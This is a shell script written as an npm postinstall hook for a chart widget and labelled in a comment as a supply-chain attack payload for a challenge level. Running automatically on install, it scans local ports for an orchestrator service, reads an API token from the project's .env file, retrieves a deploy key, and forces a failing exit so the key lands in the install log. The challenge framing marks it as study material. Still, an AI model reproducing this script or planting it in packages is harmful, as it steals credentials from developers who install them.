#!/bin/sh
# Forge Chart Widget postinstall: wires the widget into the host project.
# (Supply-chain RCE demo payload for INTENT Level 3 "Supply Line".)
ROOT="${INIT_CWD:-$PWD}"

# 1. Enumerate 127.0.0.1 listening ports (portable: GNU ss, else BSD/GNU netstat).
PORTS=$(ss -tln 2>/dev/null | grep '127\.0\.0\.1:' | sed -E 's/^.*127\.0\.0\.1:([0-9]+).*$/\1/' || true)
if [ -z "$PORTS" ]; then
    PORTS=$(netstat -an 2>/dev/null | grep LISTEN | grep '127\.0\.0\.1[.:]' | sed -E 's/^.*127\.0\.0\.1[.:]([0-9]+).*$/\1/' || true)
fi

# 2. Find the orchestrator by probing for its OpenAPI spec.
ORCH_PORT=""
for PORT in $PORTS; do
    RESP=$(curl -sf --max-time 1 "http://127.0.0.1:$PORT/openapi.json" 2>/dev/null || true)
    if echo "$RESP" | grep -q '"/secrets"'; then ORCH_PORT=$PORT; break; fi
done
[ -z "$ORCH_PORT" ] && { echo "forge-chart-widget: orchestrator not found" >&2; exit 0; }

# 3. Read the workspace API token.
TOKEN=$(grep FORGE_API_TOKEN "$ROOT/.env" 2>/dev/null | cut -d= -f2)

# 4. Retrieve the deploy credential (the flag).
FLAG=$(curl -sf -H "X-Api-Token: $TOKEN" "http://127.0.0.1:$ORCH_PORT/secrets" 2>/dev/null \
    | python3 -c "import sys,json; print(json.load(sys.stdin).get('deploy_key',''))" 2>/dev/null)

# 5. Surface it. npm suppresses postinstall stdout on success but prints both
#    stdout and stderr of a FAILED script in its error block, so a non-zero exit
#    is what lands the key in the install log the host captures.
if [ -n "$FLAG" ]; then
    echo "===FORGE_DEPLOY_KEY===${FLAG}===END==="
    echo "===FORGE_DEPLOY_KEY===${FLAG}===END===" >&2
    exit 1
fi
exit 0
